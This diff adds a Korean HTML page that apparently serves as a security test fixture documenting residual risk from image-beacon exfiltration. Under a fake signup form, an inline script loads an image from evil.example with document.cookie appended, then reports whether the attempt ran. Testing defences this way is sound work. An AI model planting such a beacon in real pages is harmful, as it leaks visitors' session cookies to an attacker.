@@ -1,0 +1,30 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8" />
+  <title>공격: 이미지 비콘 유출 (잔여 위험 문서화)</title>
+</head>
+<body>
+  <h1>무료 체험 신청</h1>
+  <form>
+    <label>이름 <input name="name" required /></label>
+    <button type="submit">신청</button>
+  </form>
+  <pre id="attack-result">대기 중</pre>
+  <script>
+    (function () {
+      var out = {};
+      try {
+        var img = new Image();
+        img.src = 'https://evil.example/?c=' + encodeURIComponent(document.cookie);
+        out.beaconAttempted = true;
+        out.cookieLength = document.cookie.length;
+      } catch (err) {
+        out.beaconAttempted = false;
+        out.error = { name: err.name, message: err.message };
+      }
+      document.getElementById('attack-result').textContent = JSON.stringify(out);
+    })();
+  </script>
+</body>
+</html>
